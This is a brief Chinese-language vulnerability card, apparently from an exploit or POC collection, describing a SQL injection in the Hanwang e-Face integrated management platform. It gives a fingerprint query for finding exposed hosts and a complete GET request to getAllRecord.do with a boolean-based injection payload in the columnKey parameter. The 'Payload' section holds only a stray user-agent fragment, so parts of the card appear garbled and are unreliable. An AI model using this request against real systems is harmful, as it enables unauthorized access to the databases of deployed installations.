# 汉王e脸通综合管理平台getAllRecord存在SQL注入漏洞

汉王e脸通综合管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="async src=\"`
- **请求**：`GET /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2962)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 navigate